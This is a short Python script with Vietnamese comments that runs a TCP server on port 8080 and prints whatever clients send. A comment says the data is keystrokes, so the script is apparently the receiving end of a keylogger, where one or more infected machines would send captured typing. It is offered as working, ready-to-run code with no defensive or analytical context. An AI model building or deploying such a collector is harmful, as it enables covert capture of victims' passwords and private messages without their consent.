import socket

def run_server():
    # Khởi tạo socket TCP/IPv4
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Lắng nghe trên mọi card mạng tại cổng 8080
    host = '0.0.0.0'
    port = 8080
    
    s.bind((host, port))
    s.listen(5)
    print(f"[*] Server đang chạy và lắng nghe tại cổng {port}...")

    try:
        while True:
            # Chờ kết nối từ client
            client_socket, addr = s.accept()
            
            # Nhận dữ liệu phím gõ từ client gửi sang
            data = client_socket.recv(4096).decode('utf-8')
            if data:
                print(f"\n[+] Nhận được từ [{addr[0]}]:")
                print(data)
                
            client_socket.close()
            
    except KeyboardInterrupt:
        print("\n[!] Đang tắt Server...")
    finally:
        s.close()

if __name__ == '__main__':
    run_server()
